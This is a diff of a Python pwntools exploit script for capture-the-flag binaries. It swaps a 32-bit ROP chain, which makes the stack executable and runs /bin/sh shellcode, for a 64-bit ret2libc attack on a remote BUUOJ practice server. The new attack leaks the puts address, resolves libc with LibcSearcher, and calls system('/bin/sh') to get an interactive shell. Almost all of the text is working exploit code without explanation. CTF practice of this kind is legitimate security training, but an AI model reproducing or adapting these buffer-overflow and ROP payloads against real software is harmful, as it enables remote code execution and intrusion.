@@ -1,24 +1,41 @@
+#! /usr/bin/python
+
 from pwn import *
+from LibcSearcher import *
 
-elf = ELF('./not_the_same_3dsctf_2016')
-#sh = remote('127.0.0.1', 1299)
-sh = process('./not_the_same_3dsctf_2016')
-#sh.recvuntil('... ')
-shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
-rop = b'\x90' * 45
-rop += p32(0x0806fcca) # pop edx,ret
-rop += p32(0x080eafec) # __stack_prot
-rop += p32(0x08048b0b) # pop eax,ret 
-rop += p32(7) # 7
-rop += p32(0x0805586b) # mov dword [edx], eax, ret
-rop += p32(0x08048b0b) # pop eax, ret
-rop += p32(0x080eafc8) # __libc_stack_end
-rop += p32(0x0809ae10) # _dl_make_stack_executable
-#rop += p32(0x080494f0) # __libc_csu_fini 栈平衡，32位不需要
-rop += p32(0x080b9113) # push esp, ret
-rop += shellcode
-with open('payloadb.txt', 'wb') as f:
-    f.write(rop)
+p = remote("node4.buuoj.cn",26815)
+context.log_level = "debug"
 
-sh.sendline(rop)
-sh.interactive()
+#Information about puts
+main_addr = 0x400b28
+puts_plt = 0x4006e0
+puts_got = 0x602020
+pop_rdi = 0x400c83
+ret_addr = 0x4006b9
+
+#1.get libc_base
+payload = b'\0' + b'a' * (0x50 + 0x8 - 0x1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+p.recvuntil("Input your choice!\n")
+p.sendline('1')
+p.recvuntil("Input your Plaintext to be encrypted\n")
+p.sendline(payload)
+p.recvuntil("Ciphertext\n")
+p.recvuntil("\n")
+puts_addr = u64(p.recv(6).ljust(0x8,b"\x00"))
+libc = LibcSearcher("puts",puts_addr)
+libc_base = puts_addr - libc.dump("puts")
+sys_addr=libc_base + libc.dump('system')
+bin_sh=libc_base + libc.dump('str_bin_sh')
+print(libc_base)
+print("libc base: ", hex(libc_base))
+print("system address: ", hex(sys_addr))
+
+#2.get shell
+payload = b'\0' + b'a' * (0x50 + 0x8 - 0x1) + p64(ret_addr) + p64(pop_rdi)  + p64(bin_sh) + p64(sys_addr)
+p.recvuntil("Input your choice!\n")
+p.sendline('1')
+p.recvuntil("Input your Plaintext to be encrypted\n")
+p.sendline(payload)
+
+p.interactive()
+
